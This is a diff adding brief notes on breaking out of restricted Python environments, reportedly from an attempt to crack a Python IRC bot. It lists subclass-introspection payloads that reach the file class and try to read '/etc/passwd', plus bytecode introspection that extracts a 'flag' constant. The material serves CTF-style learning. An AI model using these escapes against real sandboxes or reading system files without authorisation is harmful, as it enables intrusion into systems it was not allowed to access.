@@ -1,0 +1,39 @@
+
+Breaking out of python restricted environments. From init_null trying to
+crack a python IRC bot.
+
+    print __file__
+    __import__('os').listdir()
+    dir(self)
+    dir(__builtins__)
+    ().__class__.__bases__[0].__subclasses__()
+
+    dir(().__class__.__bases__[0].__subclasses__()[18])
+    ['__class__', '__delattr__', '__doc__', '__enter__', '__exit__', '__getattribute__', '__hash__', 
+    '__init__', '__iter__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__str__', 
+    'close', 'closed', 'encoding', 'fileno', 'flush', 'isatty', 'mode', 'name', 'newlines', 'next', 'read', 
+    'readinto', 'readline', 'readlines', 'seek', 'softspace', 'tell', 'truncate', 'write', 'writelines', 
+    'xreadlines']
+
+    ().__class__.__bases__[0].__subclasses__()[18]('/etc/passwd','r').read()
+    IOError: [Errno 13] Permission denied: '/etc/passwd'
+
+
+Fancy python introspection for restricted execution environment
+
+    def somecode():
+        useless = 0
+        variables = 0
+        zeros = 0
+        flag = 'l33t'
+        print "Hello World"
+
+    In [49]: somecode.func_code.co_varnames
+    Out[49]: ('useless', 'variables', 'zeros', 'flag')
+
+    In [53]: somecode.func_code.co_consts
+    Out[53]: (None, 0, 'l33t', 'Hello World')
+
+Also `func_closure` seemed interesting.
+
+References: http://docs.python.org/2/reference/datamodel.html and http://delimitry.blogspot.ca/2014/01/phdays-ctf-quals-2014-yet-another.html
